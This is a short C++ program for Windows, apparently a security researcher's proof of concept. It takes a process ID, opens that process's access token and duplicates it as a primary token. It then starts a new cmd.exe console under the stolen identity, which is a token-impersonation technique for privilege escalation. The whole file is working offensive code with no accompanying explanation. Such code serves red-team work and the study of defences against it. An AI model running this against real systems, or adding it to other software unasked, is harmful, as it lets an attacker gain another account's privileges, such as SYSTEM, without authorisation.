//Author: Jonathan Johnson

#include <windows.h>
#include <iostream>

int main(int argc, char* argv[])
{
    DWORD PID = atoi(argv[1]);

    HANDLE hToken, hDuplicate,hProcess = NULL;

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID);
    OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken);
	DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &hDuplicate);
    CreateProcessWithTokenW(hDuplicate, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	CloseHandle(hDuplicate);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return 0;
}